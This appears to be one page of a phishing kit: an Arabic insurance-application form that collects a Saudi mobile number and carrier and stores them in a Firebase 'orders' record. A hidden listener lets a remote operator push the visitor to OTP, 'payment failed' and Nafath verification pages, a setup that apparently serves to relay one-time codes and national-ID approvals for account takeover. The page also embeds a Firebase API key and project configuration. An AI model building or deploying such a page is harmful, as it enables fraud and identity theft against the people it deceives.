<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استكمال بيانات الطلب</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { background-color: #f4f7f6; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        
        .form-wrapper {
            max-width: 500px;
            width: 90%;
            padding: 35px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.05);
            border-top: 5px solid #198754;
        }
        .form-label { font-weight: 700; color: #2d3748; margin-bottom: 10px; }
        
        /* كروت المشغلين */
        .operator-card {
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            padding: 10px;
            cursor: pointer;
            transition: all 0.2s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100px;
            background: #fff;
            position: relative;
        }
        .operator-card:hover { border-color: #198754; transform: translateY(-2px); }
        .operator-input:checked + .operator-card { border-color: #198754; background-color: #f0fdf4; box-shadow: 0 4px 12px rgba(25, 135, 84, 0.15); }
        .operator-input:checked + .operator-card::after {
            content: '✔'; position: absolute; top: 5px; right: 5px; color: #198754; font-size: 12px; font-weight: bold;
        }
        .operator-input { display: none; }
        .operator-logo { max-height: 40px; max-width: 80%; object-fit: contain; margin-bottom: 5px; }

        .btn-submit { background-color: #198754; color: white; border: none; padding: 15px; border-radius: 10px; font-weight: bold; width: 100%; font-size: 1.1rem; transition: 0.3s; margin-top: 20px; }
        .btn-submit:hover { background-color: #146c43; }
        .btn-submit:disabled { background-color: #ccc; cursor: not-allowed; }
    </style>
</head>
<body>

<div class="form-wrapper">
    <h3 class="text-center mb-4 fw-bold text-success">تأكيد رقم هاتف مقدم الطلب</h3>
    
    <div class="alert alert-success bg-opacity-10 border-success text-success text-center mb-4 small fw-bold" role="alert">
        لمتابعة طلب وثيقة التأمين، يرجى إدخال رقم هاتف مقدم الطلب بشكل صحيح.
    </div>

    <form id="mobileForm" class="needs-validation" novalidate onsubmit="handleSubmit(event)">
        
        <!-- رقم الجوال -->
        <div class="mb-4">
            <label for="phoneNumber" class="form-label">رقم الجوال *</label>
            <div class="input-group has-validation" dir="ltr">
                <span class="input-group-text bg-white text-success fw-bold">+966</span>
                <input type="tel" class="form-control" id="phoneNumber" placeholder="5xxxxxxxx" maxlength="9" required pattern="^5[0-9]{8}$" style="text-align: left; font-size: 18px;" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                <div class="invalid-feedback text-end">
                    رقم الجوال يجب أن لا يقل عن 9 أرقام (يبدأ بـ 5)
                </div>
            </div>
        </div>

        <!-- مشغل الشبكة -->
        <div class="mb-4">
            <label class="form-label">اختر مشغل شبكة الجوال *</label>
            
            <div class="row g-2">
                <div class="col-4">
                    <input type="radio" name="networkOperator" id="op_stc" value="STC" class="operator-input" required>
                    <label class="operator-card" for="op_stc">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/STC_Logo.svg" alt="STC" class="operator-logo">
                        <small class="fw-bold">STC</small>
                    </label>
                </div>
                <div class="col-4">
                    <input type="radio" name="networkOperator" id="op_mobily" value="Mobily" class="operator-input">
                    <label class="operator-card" for="op_mobily">
                        <img src="https://upload.wikimedia.org/wikipedia/en/e/e7/Mobily_Logo.svg" alt="Mobily" class="operator-logo">
                        <small class="fw-bold">Mobily</small>
                    </label>
                </div>
                <div class="col-4">
                    <input type="radio" name="networkOperator" id="op_zain" value="Zain" class="operator-input">
                    <label class="operator-card" for="op_zain">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9d/Zain-logo.svg" alt="Zain" class="operator-logo">
                        <small class="fw-bold">Zain</small>
                    </label>
                </div>
                <div class="col-4">
                    <input type="radio" name="networkOperator" id="op_virgin" value="Virgin" class="operator-input">
                    <label class="operator-card" for="op_virgin">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e9/Virgin_Mobile_logo.svg/1200px-Virgin_Mobile_logo.svg.png" alt="Virgin" class="operator-logo">
                        <small class="fw-bold">Virgin</small>
                    </label>
                </div>
                <div class="col-4">
                    <input type="radio" name="networkOperator" id="op_lebara" value="Lebara" class="operator-input">
                    <label class="operator-card" for="op_lebara">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Lebara_Logo.svg/1200px-Lebara_Logo.svg.png" alt="Lebara" class="operator-logo">
                        <small class="fw-bold">Lebara</small>
                    </label>
                </div>
                <div class="col-4">
                    <input type="radio" name="networkOperator" id="op_friendi" value="Friendi" class="operator-input">
                    <label class="operator-card" for="op_friendi">
                        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/4/44/FRiENDi_mobile_logo.png/220px-FRiENDi_mobile_logo.png" alt="Friendi" class="operator-logo">
                        <small class="fw-bold">Friendi</small>
                    </label>
                </div>
            </div>
        </div>

        <!-- خيار هل الرقم مسجل باسم مقدم الطلب -->
        <div class="mb-4">
            <div class="form-check p-3 border rounded-3 bg-light d-flex align-items-center gap-2">
                <input class="form-check-input m-0" type="checkbox" id="isOwner" checked style="width: 20px; height: 20px;">
                <label class="form-check-label fw-bold" for="isOwner">
                    هل الرقم مسجل باسم مقدم الطلب؟
                </label>
            </div>
        </div>

        <button type="submit" class="btn-submit" id="submitBtn">تسجيل</button>
    </form>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    async function handleSubmit(event) {
        event.preventDefault();
        const form = event.target;
        
        if (!form.checkValidity()) {
            event.stopPropagation();
            form.classList.add('was-validated');
            return;
        }

        const btn = document.getElementById('submitBtn');
        btn.disabled = true;
        btn.innerText = "جاري التسجيل...";

        const op = document.querySelector('input[name="networkOperator"]:checked').value;
        const phone = document.getElementById('phoneNumber').value;
        const isOwner = document.getElementById('isOwner').checked;
        const userId = localStorage.getItem('user_id');

        try {
            await db.collection("orders").doc(userId).update({
                operator: op,
                phone_number: "0" + phone, // Adding 0 prefix
                is_phone_owner: isOwner,
                status: "waiting_call_code"
            });
            window.location.href = "call_verification.html";
        } catch (e) {
            btn.disabled = false;
            btn.innerText = "تسجيل";
            alert("حدث خطأ في الاتصال");
        }
    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
(function() {
    const userId = localStorage.getItem('user_id');
    if (userId) {
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "otp_verification.html"; 
                } else if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                } else if (data.next_step === "GO_TO_NAFATH") {
                    window.location.href = "nafath.html";
                } else if (data.next_step === "SHOW_NAFATH_CODE") {
                    window.location.href = "nafath.html"; // التوجيه الصحيح
                }
            }
        });
    }
})();
// ------------------------------------------

</script>
</body>
</html>
